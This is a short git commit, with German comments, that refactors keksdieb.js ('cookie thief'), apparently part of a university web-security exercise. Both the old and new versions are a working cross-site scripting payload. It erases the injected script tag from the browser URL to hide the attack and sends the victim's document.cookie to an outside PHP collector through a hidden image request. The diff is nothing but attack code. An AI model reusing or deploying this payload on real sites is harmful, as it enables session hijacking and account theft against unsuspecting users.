5970679f80844bb1ac0eaa0188deb096c278224f
Max Beier <beierm@htw-berlin.de>
2015-08-04 16:16:29 +0200

    Code zum Laden des Bildes in keksdieb.js verkürzt

--- kekse/keksdieb.js
+++ kekse/keksdieb.js
@@ -2,10 +2,7 @@
 var url = 'https://studi.f4.htw-berlin.de/~s0543210/keksdose.php';
 
 // Ersetze die aktuelle URL durch eine saubere Version, um den Angriff zu verschleiern
-window.history.replaceState({}, '', window.location.href.replace(/%3Cscript.*script%3E/,''));
+history.replaceState({}, '', location.href.replace(/%3Cscript.*script%3E/, ''));
 
 // Lade die Keksdose als Bild und übergib den Cookie als Parameter in der URL
-var img = document.createElement('img');
-img.src = url + '?cookie=' + document.cookie;
-img.style.display = 'none';
-document.body.appendChild(img);
+new Image().src = url + '?cookie=' + document.cookie;
